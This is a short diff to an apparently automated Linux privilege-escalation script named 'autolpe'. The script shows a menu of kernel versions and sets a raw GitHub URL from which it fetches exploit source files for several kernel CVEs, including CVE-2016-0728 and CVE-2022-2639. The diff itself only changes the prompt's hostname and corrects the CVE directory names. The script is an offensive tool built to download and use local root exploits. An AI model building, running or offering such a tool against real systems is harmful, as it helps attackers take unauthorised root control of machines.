@@ -14,7 +14,7 @@ echo "[3] 4x.x"
 echo "[4] 5x.x"
 echo "[5] TOP Root Exploit"
 echo "[6] Folder Exploit"
-read -p "autolpe@localhost:~# " localroot
+read -p "autolpe@warga-sipil:~# " localroot
 link="https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/"
 
 kernel2=(
@@ -52,8 +52,8 @@ kernel3=(
     2016/CVE-2016-0728/cve-2016-0728.c
     2016/CVE-2016-9793/poc.c
     2017/CVE-2017-7308/poc.c
-    2022/CVE20222639/exploit.c
-    2022/CVE20222639/poc.c -O poc2.c
+    2022/CVE-2022-2639/exploit.c
+    2022/CVE-2022-2639/poc.c -O poc2.c
 )
 
 kernel4=(
